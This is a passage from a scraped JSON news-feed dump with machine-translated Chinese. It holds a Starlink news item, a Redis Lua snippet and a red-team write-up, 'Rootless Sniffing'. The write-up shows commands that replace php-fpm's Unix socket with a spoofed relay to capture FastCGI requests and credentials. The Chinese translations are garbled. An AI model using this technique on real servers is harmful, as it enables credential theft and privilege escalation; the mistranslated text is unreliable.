Starlink\u662f\u8d8a\u6765\u8d8a\u591a\u7684\u5c0f\u536b\u661f\u5236\u9020\u5546\u4e4b\u4e00\uff0c\u4e5f\u5305\u62ec\u4e9a\u9a6c\u900a\uff0c\u82f1\u56fd\uff06\uff0339; S Oneweb\uff0cVenture\u8d44\u672c\u652f\u6301\u7684\u661f\u7403\u548c\u96f7\u795e\u6280\u672f\u516c\u53f8\u7684\u84dd\u5ce1\u8c37\u6280\u672f\u3002 \n\u6765\u6e90\uff1a\u8def\u900f\u793e ", "note_en": "SYDNEY: Starlink, the satellite internet unit of Elon Musk&#39;s SpaceX, expects to be able to provide continuous global coverage by around September but will then need to seek regulatory approvals, its president Gwynne Shotwel said on Tuesday.\n &#34;We&#39;ve successfully deployed 1,800 or so satellites and once all those satellites reach their operational orbit, we will have continuous global coverage, so that should be like September timeframe,&#34; she told a Macquarie Group technology conference via webcast.\n     &#34;But then we have regulatory work to go into every country and get approved to provide telecoms services.&#34;\n Starlink, which has said it plans to deploy 12,000 satellites in total at a cost of roughly US$10 billion, currently offers beta services in 11 countries, Shotwel said.\n In May, Musk said the low-Earth orbiting satellite network had received more than 500,000 preorders for its internet service and anticipates no technical problems meeting demand.\n The U.S. Federal Communications Commission this year approved SpaceX&#39;s plan to deploy some Starlink satellites at a lower earth orbit than planned to provide high-speed broadband internet services to people who currently lack access.\n     Starlink is one of a growing number of makers of small satellites that also includes Amazon.com&#39;s Kuiper, Britain&#39;s OneWeb, venture capital-backed Planet, and Raytheon Technologies Corp&#39;s Blue Canyon Technologies.\n  Source: Reuters", "posttime": "2021-06-22 16:42:41", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "starlink,\u6280\u672f", "title": "Spacex\u7684Starlink\u671f\u671b\u5b83\u53ef\u4ee5\u57289\u6708\u5de6\u53f3\u63d0\u4f9b\u5168\u7403\u8986\u76d6\u8303\u56f4 ", "title_en": "SpaceX's Starlink expects it can provide global coverage around September", "transed": 1, "url": "https://www.channelnewsasia.com/news/business/spacex-s-starlink-expects-it-can-provide-global-coverage-around-september-15066036", "via": "", "real_tags": ["starlink", "\u6280\u672f"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067389, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u66fe\u51e0\u4f55\u65f6\uff0c\u4e00\u4e2a\u83dc\u9e1f\u5728\u670d\u52a1\u5668\u4e0a\u627e\u5230\u4e86\u4e00\u4e2aRCE\uff0c\u4f46\u6ca1\u6709\u5f97\u5230root\uff0cnoob\u60f3\u8981\u55c5\u63a2\u5230\u8fbe\u90a3\u4e2a\u670d\u52a1\u5668\u7684\u8bf7\u6c42\uff0c\u4ee5\u5347\u7ea7\u6743\u9650\uff0c\u4f46\u6ca1\u6709\u77e5\u9053\u5982\u4f55\u3002\u90a3\u4e2a\u83dc\u9e1f\u662f\u6211\uff0c\u8fd9\u662f\u6211\u7684\u6545\u4e8b\u3002\n  \u597d\u7684\uff0c\u5ffd\u7565\u5e9f\u8bdd\u4ecb\u7ecd\u3002\u6211\u53ef\u4ee5\u8bbf\u95eewww-data\u7528\u6237\uff0c\u670d\u52a1\u5668\u8fd0\u884cnginx + php-fpm\uff0c\u6211\u600e\u4e48\u80fd\u55c5\u5230\u8bf7\u6c42\u800c\u4e0d\u70d9\u5b83\u6765\u8fd0\u884ctcpdump\uff1f nginx\u548cphp-fpm\u4e3b\u8fdb\u7a0b\u4ee5root\u8eab\u4efd\u8fd0\u884c\uff0c\u4f46\u5de5\u4eba\u5728www-data\u4e0a\u8fd0\u884c\u3002\u54e6\uff0c\u8fd9\u662f\u4e00\u4e2a\u7801\u5934alpine\u5b9e\u4f8b\uff0cfack\u3002\n   \u60f3\u5230\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\u901a\u8fc7/ proc / pid / mem\u6765\u629b\u5f03nginx / php-fpm\u5de5\u4f5c\u8005\u7684\u8bb0\u5fc6\uff0c\u5e76\u5e0c\u671b\u8bf7\u6c42\u5728\u90a3\u91cc\u3002\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e\u5b83\u7684\u6f02\u4eae\u7ebf\u7a0bUnix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux\u5f97\u5230\u4e86\u5927\u90e8\u5206\u4fe1\u606f\u3002\n \u6211\u9047\u5230\u7684\u95ee\u9898\u662f\u5927\u591a\u6570\u5de5\u5177/\u811a\u672c\u90fd\u4f7f\u7528ptrace syscall\u5728\u8f6c\u50a8\u4e4b\u524d\u9644\u52a0\u5230\u8fc7\u7a0b\uff0c\u5e76\u4e14\u60a8\u53ef\u4ee5\uff06\uff0339; t ptrace\u5728\u8c37\u4ed3\u4e0a\u7684\u8c37\u4ed3\u4e0a\u7684docker\u4e0a\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u914d\u7f6e - add = sys_ptrace\u6216docker-compose.yml\uff1a\n   \u57284.8\u4e4b\u540e\u7684Docker\u8fd0\u884c\u5185\u6838\u4e0a\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528process_vm_readv syscall\u8f6c\u50a8\u5185\u5b58\u800c\u65e0\u9700\u9644\u52a0\u5230\u5b83\uff0c\u4f46\u60a8\u4ecd\u7136\u53ef\u4ee5\uff06\uff0339; t\u8f6c\u50a8\u7528\u6237\u4e0b\u7684\u4efb\u4f55\u8fdb\u7a0b\u7684\u5185\u5b58\u3002\u5982\u679c/ proc / sys / kernel / yama / ptrace_scope\u8bbe\u7f6e\u4e3a1\uff0c\u5219\u53ea\u5141\u8bb8ptrace / process_vm_readv\u5982\u679c\u60a8\u7684powercess\u662f\u60a8\u60f3\u8981Ptrace\u7684\u7236\u4eb2\uff0c\u5982\u679c\u5b83\uff06\uff0339; s\u8bbe\u7f6e\u4e3a\u96f6\uff0c\u60a8\u53ef\u4ee5\u8f6c\u50a8\u5185\u5b58\uff0c\u4f46\u5b83\u9ed8\u8ba4\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\u9ed8\u8ba4\u4e3a\uff06\uff0339; s 1\u3002 yama On General\u4e0a\u66f4\u591a\u4fe1\u606f\uff1akernel.org/doc/documentation/security/yama.txt\n \u57fa\u672c\u4e0a\uff0c\u6211\u53ea\u80fd\u8f6c\u50a8\u6211\u5728\u6211\u7684\u7528\u6237\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u7684\u5185\u5b58\uff0c\u800c\u4e0d\u662f\u6211\u7684\u7528\u6237\u8fd0\u884c\u7684\u4efb\u4f55\u8fdb\u7a0b\u3002\u5de5\u4f5c\u4eba\u5458\u7531root\u4e0b\u8fd0\u884c\u7684\u5927\u5e08\u8fdb\u7a0b\u6267\u884c\uff1a\uff06\uff0339;\uff08\u6211\u4e5f\u53ef\u4ee5\u4ecewww-data\u5220\u9664\u4e00\u4e2a\u65b0\u5de5\u4eba\uff0c\u56e0\u4e3a\u4e3b\u8fdb\u7a0b\u5c06\u5ffd\u7565\u5b83\u3002\n    \u8fd9\u91cc\u7684\u60f3\u6cd5\u662f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u8bf7\u6c42\uff0cnginx\u5de5\u4eba\u5c06\u6253\u5f00\u8be5\u5957\u63a5\u5b57\u7684\u65b0\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5982\u679ci\uff06\uff0339; m\u5feb\u901f\uff0cvia / proc / pid / fd / n\u53ef\u4ee5\u8f6c\u50a8\u4ed6\u7684\u5185\u5bb9\u3002\u5b83\uff06\uff0339;\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u60f3\u6cd5\uff0c\u4f46\u4f60\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u6587\u4ef6/ proc / pid / fd / n\u4e0e\u5957\u63a5\u5b57/\u7ba1\u9053\u4ea4\u4e92\u3002 \nWarning: Can only detect less than 5000 characters\n\u6240\u4ee5\u6211\u5236\u4f5c\u4e86\u4e00\u4e2a\u81ea\u52a8\u5316\u8fd9\u4e00\u6574\u4e2a\u8fc7\u7a0b\u7684\u811a\u672c\uff0c\u5e76\u786e\u4fdd\u5982\u679c\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\uff0c\u5b83\u5c06\u91cd\u547d\u540d\u65e7\u5957\u63a5\u5b57\u540e\u9000\uff0c\u4ee5\u4fbf\u670d\u52a1\u5668\u6ca1\u6709\u8131\u673a\uff06\uff0339;\n  / tmp $ ./dsm .php-fpm.sockUnix\u57df\u5957\u63a5\u5b57emifferby @caioluders [\uff1f]\u91cd\u547d\u540d\u4e3a.php-fpm.sock.1 [\uff1f]\u7ed1\u5b9a\u6b3a\u9a97\u5957\u63a5\u5b57.php-fpm.sock [\uff1f ]\u6b3a\u9a97\u5957\u63a5\u5b57\u6b63\u5728\u503e\u542c... [\uff1f]\u65b0\u8fde\u63a5---------------------------------------------- php-fpm.sock ------------------------------------------ recket_filename / api / public / index.php QUERY_STRINGq = /\uff06\u5b89\u57f9; REQUEST_METHODGET CONTENT_TYPECONTENT_LENGTHSCRIPT_NAME / index.php\u7684REQUEST_URI / DOCUMENT_URI / index.phpDOCUMENT_ROOT / API / publiSERVER_PROTOCOLHTTP / 1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI / 1.1 SERVER_SOFTWAREnginx / 1.18.0REMOTE_ADDR172.18.0.1 REMOTE_PORT57778SERVER_ADDR172.18.0.2 SERVER_PORT80 SERVER_NAME_REDIRECT_STATUS200 HTTP_HOST127.0.0.1\uff1a9022RHTTP_USER_AGENTMozilla / 5.0\uff08Macintosh;\u82f1\u7279\u5c14Mac OS X 10.14; RV\uff1a85.0\uff09Gecko / 20100101 Firefox / 85.0 jhttp_accepttext / html\uff0capplication / xhtml + xml\uff0capplication / xml; q = 0.9\uff0cimhttp_accept_encodinggzip\uff0cdeflatenguagept-br\uff0cpt; q = 0.8 \uff0cen-US; q = 0.5\uff0cen; q = 0.3http_connectionKeep-Alivehttp_upgrade_inseCure_Requests1 --------------- ---------------------\u65b0\u6570\u636e\u5305----------------------- ----------------------------------------php-FPM\u3002\u889c\u5b501 ------------------------------------\u4e3b\u811a\u672cUnknownKStatus\uff1a404\u4e0d\u662fFoundX Powered-by\uff1a PHP / 7.4.15 CContent\u578b\uff1aTEXT / HTML; charset = UTF-8\u672a\u627e\u5230\u3002[\uff1f]\u65b0\u8fde\u63a5\n   \u5728UNIX\u5185\u6838\u4e0a\uff0c\u6211\u731c\u6d4b\u7684\u662f\u6211\u731c\u7684\u4e00\u4e2aWeb\u5bb6\u4f19\uff0c\u5e76\u5e2e\u52a9\u66f4\u597d\u5730\u4e86\u89e3Linux\u5185\u6838\u4e0a\u7684\u57fa\u672c\u6388\u6743\u6d41\u7a0b\uff0c\u771f\u7684\u5f88\u6709\u654f\u611f\u3002\u6211\u7684\u5927\u591a\u6570\u60f3\u6cd5\u90fd\u662f\u72d7\u5c4e\uff0c\u5e76\u6ca1\u6709\u5de5\u4f5c\uff0c\u53d1\u73b0\u6211\u53ef\u4ee5\u6b3a\u9a97unix\u57df\u5957\u63a5\u5b57\uff0cnginx\u5185\u90e8\u7528\u4e8e\u6211\u7684\u65b0\u6280\u672f\u3002\u5982\u679c\u60a8\u5728\u767b\u5f55POST\u8bf7\u6c42\u4e0a\u83b7\u53d6\u7eaf\u6587\u672c\u51ed\u636e\uff0c\u5219\u53ef\u4ee5\u5728\u7ea2\u8272\u7ec4\u5408\u4e0a\u4f7f\u7528\u7ea2\u8272\u7ec4\u5408\u4ee5\u5347\u7ea7\u6743\u9650\u3002\u60a8\u8fd8\u53ef\u4ee5\u505a\u7684\u4e0d\u4ec5\u4ec5\u662f\u55c5\u63a2\u8bf7\u6c42\uff1a\u60a8\u53ef\u4ee5\u66f4\u6539\u670d\u52a1\u5668\uff06\uff0339;\u54cd\u5e94\uff01\u4f7f\u7528\u4f60\u7684\u60f3\u8c61\u529b\uff0c\u4e5f\u8bb8\u6211\u4ee5\u540e\u505a\u4e00\u4e2a\u5de5\u5177\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\n \u6211\u4e0d\u77e5\u9053\u54ea\u4e2a\u6846\u67b6\u4f7f\u7528Unix\u57df\u5957\u63a5\u5b57\u4ee5\u4e0enginx + php-fpm\u76f8\u540c\u7684\u65b9\u5f0f\u4f7f\u7528\uff0c\u4f46\u6211\u60f3\u5e94\u8be5\u5b58\u5728\u66f4\u591a\u7684\u4e0a\u4e0b\u6587\uff0c\u5982\u679c\u60a8\u53d1\u73b0\u66f4\u591a\u573a\u666f\uff0c\u8bf7\u53d1\u5e03\u5b83\u3002 ", "note_en": "Once upon a time, a noob found an RCE on a server but didn&#39;t got root, the noob wanted to sniff the requests that were arriving on that server, to escalate privileges, but didn&#39;t know how. That noob is me , and this is my story.\n  Okay, ignore the bullshit intro.I had access to the  www-data user, and the server was running  Nginx+php-fpm, how could I sniff the requests without rooting it to run  tcpdump? The  Nginx and  php-fpm master processes run as  root, but the workers run on  www-data. Oh, and it was a docker alpine instance, fack.\n   The first idea that came to mind was to just dump the memory of the  Nginx/php-fpm workers via the  /proc/PID/mem and hope that the requests are there. Here is a nice thread about it  unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux got most of the info there.\n The problem that I ran into was that most tools/scripts uses the  ptrace syscall to attach to the process before dumping it, and you can&#39;t  ptrace at all on Docker on kernels older than 4.8 without a specific config  --cap-add=SYS_PTRACE or on  docker-compose.yml :\n   On Docker running kernels after 4.8 you can use the  process_vm_readv syscall to dump the memory without attaching to it, but you still can&#39;t dump the memory of any process under your user. If the  /proc/sys/kernel/yama/ptrace_scope is set to  1 it will only allow  ptrace/ process_vm_readv if your proccess is the father of the process you want to  ptrace, if it&#39;s set to zero you can dump the memory, but it&#39;s  1 by default on most systems. More info on  Yama on general :  kernel.org/doc/Documentation/security/Yama.txt\n Basically I can only dump the memory of a process that I executed, not of any process running on my user. The workers are executed by the masters process that run under root :&#39;( I also can&#39;t just spawn a new worker from  www-data because the master process will ignore it.\n    The idea here was that to each request the Nginx worker was going to open a new file descriptor to that socket, and I could dump his contents, if I&#39;m quick, via  /proc/PID/fd/N. It&#39;s a nice idea, but you can&#39;t interact with sockets/pipes by just using the file  /proc/PID/fd/N.\n There is one way that I found to achieve this: copying all the file descriptors using the fairly new syscall  pidfd_getfd, this was introduced on kernel 5.6, with the  pidfd_open syscall you can open a new file descriptor that refers to another process, with that you can use  pidfd_getfd to copy all file descriptors and use them. Now for the sad part:  pidfd_getfd permissions are governed by  ptrace (T_T) So this falls in the same problem as dumping the memory.\n  Reading through the config file of  php-fpm I found out that it used a  Unix domain socket to communicate with Nginx using  Fastcgi , what a horrible name btw.\n  [...]; The address on which to accept FastCGI requests.; Valid syntaxes are:; &#39;ip.add.re.ss:port&#39; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &#39;port&#39; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &#39;/path/to/unix/socket&#39; - to listen on a unix socket.; Note: This value is mandatory.listen = /tmp/.php-fpm.sock[...]\n So I began to search for ways of sniffing the Unix domain socket, and turns out it&#39;s pretty hard to properly sniff it, mainly because it isn&#39;t bound to any protocol, and most reliable ways use  ptrace, but a dirty hack it&#39;s to just rename the socket, everything&#39;s a file on unix yadayada, and create a new one that MiTM it , like this  superuser.com/a/576404, using  socat. Note that this only works if you can write on the socket&#39;s directory, I&#39;m still not sure if this is the default when using a supervisor, or it&#39;s a misconfig putting the socket on  /tmp, but surely it isn&#39;t that uncommon.So here&#39;s the first attempt using  socat :\n /tmp $ iduid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/tmp $ mv .php-fpm.sock .php-fpm.sock.1/tmp $ ./socat -t100 -x -v UNIX-LISTEN:/tmp/.php-fpm.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/tmp/.php-fpm.sock.1&gt; 2021/03/25 08:47:56.069495 length=816 from=0 to=815 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 ................ 01 04 00 01 03 06 02 00 0f 15 53 43 52 49 50 54 ..........SCRIPT 5f 46 49 4c 45 4e 41 4d 45 2f 61 70 69 2f 70 75 _FILENAME/api/pu 62 6c 69 63 2f 69 6e 64 65 78 2e 70 68 70 0c 07 blic/index.php.. 51 55 45 52 59 5f 53 54 52 49 4e 47 71 3d 2f 68 QUERY_STRINGq=/h 65 79 26 0e 03 52 45 51 55 45 53 54 5f 4d 45 54 ey&amp;..REQUEST_MET 48 4f 44 47 45 54 0c 00 43 4f 4e 54 45 4e 54 5f HODGET..CONTENT_ 54 59 50 45 0e 00 43 4f 4e 54 45 4e 54 5f 4c 45 TYPE..CONTENT_LE 4e 47 54 48 0b 0a NGTH.. 53 43 52 49 50 54 5f 4e 41 4d 45 2f 69 6e 64 65 SCRIPT_NAME/inde 78 2e 70 68 70 0b 04 52 45 51 55 45 53 54 5f 55 x.php..REQUEST_U 52 49 2f 68 65 79 0c 0a RI/hey.. 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 69 6e 64 DOCUMENT_URI/ind 65 78 2e 70 68 70 0d 0b 44 4f 43 55 4d 45 4e 54 ex.php..DOCUMENT 5f 52 4f 4f 54 2f 61 70 69 2f 70 75 62 6c 69 63 _ROOT/api/public 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f ..SERVER_PROTOCO 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45 LHTTP/1.1..REQUE 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47 ST_SCHEMEhttp..G 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45 ATEWAY_INTERFACE 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f CGI/1.1..SERVER_ 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e SOFTWAREnginx/1. 31 38 2e 30 0b 0a 18.0.. 52 45 4d 4f 54 45 5f 41 44 44 52 31 37 32 2e 31 REMOTE_ADDR172.1 38 2e 30 2e 31 0b 05 52 45 4d 4f 54 45 5f 50 4f 8.0.1..REMOTE_PO 52 54 35 37 35 38 30 0b 0a RT57580.. 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e 31 SERVER_ADDR172.1 38 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 4f 8.0.2..SERVER_PO 52 54 38 30 0b 01 53 45 52 56 45 52 5f 4e 41 4d RT80..SERVER_NAM 45 5f 0f 03 52 45 44 49 52 45 43 54 5f 53 54 41 E_..REDIRECT_STA 54 55 53 32 30 30 09 0e 48 54 54 50 5f 48 4f 53 TUS200..HTTP_HOS 54 31 32 37 2e 30 2e 30 2e 31 3a 39 30 32 32 0f T127.0.0.1:9022. 52 48 54 54 50 5f 55 53 45 52 5f 41 47 45 4e 54 RHTTP_USER_AGENT 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 4d 61 63 Mozilla/5.0 (Mac 69 6e 74 6f 73 68 3b 20 49 6e 74 65 6c 20 4d 61 intosh; Intel Ma 63 20 4f 53 20 58 20 31 30 2e 31 34 3b 20 72 76 c OS X 10.14; rv 3a 38 35 2e 30 29 20 47 65 63 6b 6f 2f 32 30 31 :85.0) Gecko/201 30 30 31 30 31 20 46 69 72 65 66 6f 78 2f 38 35 00101 Firefox/85 2e 30 0b 4a 48 54 54 50 5f 41 43 43 45 50 54 74 .0.JHTTP_ACCEPTt 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61 ext/html,applica 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61 tion/xhtml+xml,a 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71 pplication/xml;q 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70 2c =0.9,image/webp, 2a 2f 2a 3b 71 3d 30 2e 38 14 23 48 54 54 50 5f */*;q=0.8.#HTTP_ 41 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 70 ACCEPT_LANGUAGEp 74 2d 42 52 2c 70 74 3b 71 3d 30 2e 38 2c 65 6e t-BR,pt;q=0.8,en 2d 55 53 3b 71 3d 30 2e 35 2c 65 6e 3b 71 3d 30 -US;q=0.5,en;q=0 2e 33 14 0d 48 54 54 50 5f 41 43 43 45 50 54 5f .3..HTTP_ACCEPT_ 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c 20 64 65 ENCODINGgzip, de 66 6c 61 74 65 0f 0a flate.. 48 54 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b HTTP_CONNECTIONk 65 65 70 2d 61 6c 69 76 65 1e 01 48 54 54 50 5f eep-alive..HTTP_ 55 50 47 52 41 44 45 5f 49 4e 53 45 43 55 52 45 UPGRADE_INSECURE 5f 52 45 51 55 45 53 54 53 31 00 00 01 04 00 01 _REQUESTS1...... 00 00 00 00 01 05 00 01 00 00 00 00 ............--&lt; 2021/03/25 08:47:56.098735 length=168 from=0 to=167 01 07 00 01 00 16 02 00 50 72 69 6d 61 72 79 20 ........Primary 73 63 72 69 70 74 20 75 6e 6b 6e 6f 77 6e 00 00 script unknown.. 01 06 00 01 00 6b 05 00 53 74 61 74 75 73 3a 20 .....k..Status: 34 30 34 20 4e 6f 74 20 46 6f 75 6e 64 0d 0a 404 Not Found.. 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 50 48 X-Powered-By: PH 50 2f 37 2e 34 2e 31 35 0d 0a P/7.4.15.. 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 74 65 Content-type: te 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65 74 xt/html; charset 3d 55 54 46 2d 38 0d 0a =UTF-8.. 0d 0a .. 46 69 6c 65 20 6e 6f 74 20 66 6f 75 6e 64 2e 0a File not found.. 00 00 00 00 00 01 03 00 01 00 08 00 00 00 00 00 ................ 00 00 00 00 00 .....--\n Yay! The  socat worked locally and I was seeing the FastCGI requests, but  socat has some problems:\n I don&#39;t want to depend on  socat as it&#39;s a red flag on any server and a pretty big binary.\n So I made a script that automatizes this whole process, and makes sure that if anything goes wrong it will rename the old socket back so the server doesn&#39;t go offline.\n  /tmp $ ./dsm .php-fpm.sockUnix Domain Socket Snifferby @caioluders[?] Renamed .php-fpm.sock to .php-fpm.sock.1[?] Bind spoofed socket .php-fpm.sock[?] Spoofed socket is listening...[?] New connection------------------------------------ .php-fpm.sock ------------------------------------SCRIPT_FILENAME/api/public/index.php QUERY_STRINGq=/&amp;REQUEST_METHODGET CONTENT_TYPECONTENT_LENGTHSCRIPT_NAME/index.php REQUEST_URI/DOCUMENT_URI/index.phpDOCUMENT_ROOT/api/publiSERVER_PROTOCOLHTTP/1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI/1.1 SERVER_SOFTWAREnginx/1.18.0REMOTE_ADDR172.18.0.1 REMOTE_PORT57778SERVER_ADDR172.18.0.2 SERVER_PORT80 SERVER_NAME_REDIRECT_STATUS200 HTTP_HOST127.0.0.1:9022RHTTP_USER_AGENTMozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0 JHTTP_ACCEPTtext/html,application/xhtml+xml,application/xml;q=0.9,imHTTP_ACCEPT_ENCODINGgzip, deflateNGUAGEpt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3HTTP_CONNECTIONkeep-aliveHTTP_UPGRADE_INSECURE_REQUESTS1------------------------------------- New Packet ------------------------------------------------------------------------ .php-fpm.sock.1 -----------------------------------Primary script unknownkStatus: 404 Not FoundX-Powered-By: PHP/7.4.15Content-type: text/html; charset=UTF-8File not found.[?] New connection\n   It was really insightful to go this low on the unix kernel, I&#39;m more of a web guy I guess, and helped a lot to better understand basic authorization flows on the linux kernel. Altho most of my ideas were shit and didn&#39;t work, having found that I can spoof the Unix domain socket that the Nginx uses internally is a new technique for me. This can be used on red teaming to escalate privileges, if you weren&#39;t able to root it, by getting plain text credentials on a login POST request for example. You can also do more than just sniffing the requests: you can alter the server&#39;s responses! Use your imagination, maybe I make a tool later to achieve that.\n I don&#39;t know which frameworks uses a Unix domain socket in the same way as  Nginx+php-fpm, but I guess that should exist more contexts that this works, please publish it if you find more scenarios.", "posttime": "2021-06-22 15:54:57", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u55c5\u95fb,rootless,\u8fd0\u884c", "title": "\u65e0\u6839\u55c5\u95fb ", "title_en": "Rootless Sniffing", "transed": 1, "url": "https://lude.rs/h4ck1ng/rootless_sniffing.html", "via": "", "real_tags": ["\u55c5\u95fb", "rootless", "\u8fd0\u884c"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067388, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u65e0\u804a\u7684\uff1f \u627e\u5230\u771f\u6b63\u968f\u673a\u548c\u552f\u4e00\u7684\u670d\u52a1\u5668\u6765\u6df7\u6dc6\u3002 ", "note_en": "Bored? Find truly random and unique servers to mess with.", "posttime": "2021-06-22 15:54:51", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "casino,random,\u670d\u52a1\u5668", "title": "server.casino  - \u8de8\u4e92\u8054\u7f51\u968f\u673a\u670d\u52a1\u5668 ", "title_en": "Server.casino \u2013 Random Servers Across the Internet", "transed": 1, "url": "http://server.casino/", "via": "", "real_tags": ["casino", "random", "\u670d\u52a1\u5668"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067387, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u81ea\u7528\u4e8e\u68c0\u7d22\u6765\u81ea\u7f13\u5b58\u6570\u636e\u7684\u6a21\u5f0f\u7c7b\u578b\u7684\u81ea\u6a21\u5178\u53ef\u4ee5\u4fdd\u5b58\u6709\u6548\u7684\u7f51\u7edc\u5e26\u5bbd\u548c\u8ba1\u7b97\u5468\u671f\u3002\n  \u6570\u636e\u4fee\u6539\u65f6\u95f4\u5f15\u7528\u5e94\u6765\u81ea\u5ba2\u6237\u7aef\uff0c\u5e76\u4f5c\u4e3a\u6839\u636e\u4ec5\u4ec5\u6700\u540e\u4e00\u6b21\u4e0a\u6b21\u8fde\u63a5\u5230\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u7684\u975e\u786e\u8ba4\u7c7b\u578b\u7684\u65b9\u6cd5\uff0c\u4f5c\u4e3a\u8bf7\u6c42\u7684\u4e00\u90e8\u5206\u800c\u4e0d\u662f\u5728\u670d\u52a1\u5668\u4fa7\u88ab\u53d1\u9001\u3002\n  \u5728Redis\u670d\u52a1\u5668\u7aef\u5229\u7528Lua\u5728Redis\u4e0a\u5229\u7528Lua\uff0c\u5728\u5ef6\u8fdf\u65b9\u9762\u7684\u5f00\u9500\u975e\u5e38\u5c11\uff0c\u8fd9\u7c7b\u6a21\u5f0f\u662f\u53ef\u80fd\u7684\u3002\n  \u6211\u4eec\u53ef\u4ee5\u5c06\u952e\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u5b58\u50a8\u5728\u54c8\u5e0c\u4e2d\uff0c\u5e76\u4ec5\u5728\u8f83\u65b0\u7684\u65f6\u68c0\u7d22\u503c\uff0c\u800c\u4e0d\u662f\u53d1\u9001\u7684\u65f6\u95f4\u5ba2\u6237\u7aef\u3002\n  \u4ee5\u4e0bLua\u4ee3\u7801\u6bb5\u5b58\u50a8/\u68c0\u7d22\u57fa\u4e8e\u6563\u5217\u4e2d\u7684\u952e\u7684\u4fee\u6539\u65f6\u95f4\uff0c\u79f0\u4e3amy_keystime\u3002\n    local keys_mtime_hset =\uff06\uff0334; my_keysmtime\uff06\uff0334;\u672c\u5730\u952e=\u952e[1]\u672c\u5730mtime = tonumber\uff08argv [1]\uff09\u672c\u5730key_mtime = redis\u3002\u547c\u53eb\uff08\uff06\uff0339; hget\uff06\uff0339;\uff0ckeys_mtime_hset\uff0ckey\uff09key_mtime = tonumber\uff08key_mtime\uff09 - \u5982\u679c\u54c8\u5e0c\u96c6\u4e2d\u7684\u7f3a\u5c11\u952e\u8fd4\u56de\u952e\u7684\u503c\u3002 - \u6216\u952emtime\uff06gt;\u5982\u679c\u4e0d\u662fkey_mtime\u6216key_mtime\uff06gt; mtime\u7136\u540e\uff0cMify\u8fd4\u56deRedis\u3002\u547c\u53eb\uff08\uff06\uff0339; get\uff06\uff0339; key\uff09\u7ed3\u675f\u8fd4\u56denil\n    local keys_mtime_hset =\uff06\uff0334; my_keysmtime\uff06\uff0334;\u672c\u5730\u952e=\u952e[1]\u672c\u5730\u503c= argv [1]\u672c\u5730mtime = tonumber\uff08argv [2]\uff09redis\u3002\u81f4\u7535\uff08\uff06\uff0339;\u8bbe\u7f6e\uff06\uff0339;\uff0ckey\uff0cpresigs\uff09redis\u3002\u547c\u53eb\uff08\uff06\uff0339; hset\uff06\uff0339;\uff0ckeys_mtime_hset\uff0ckey\uff0cmtime\uff09 \n\u5ba2\u6237\u7aef\u5728\u68c0\u7d22\u548c\u8bbe\u7f6e\u5bc6\u94a5\u65f6\u53d1\u9001\u4fee\u6539\u65f6\u95f4\u3002 Redis Lua\u811a\u672c\u662f\u539f\u5b50\u7684\u3002\n    mtime_get =\uff06\uff0334;\uff06\uff0334;\uff06\uff0334; local keys_mtime_hset =\uff06\uff0334; my_keysmtime\uff06\uff0334; local key = keys [1]\u672c\u5730mtime = tonumber\uff08argv [1]\uff09local key_mtime = redis.call\uff08\uff06 \uff0339; 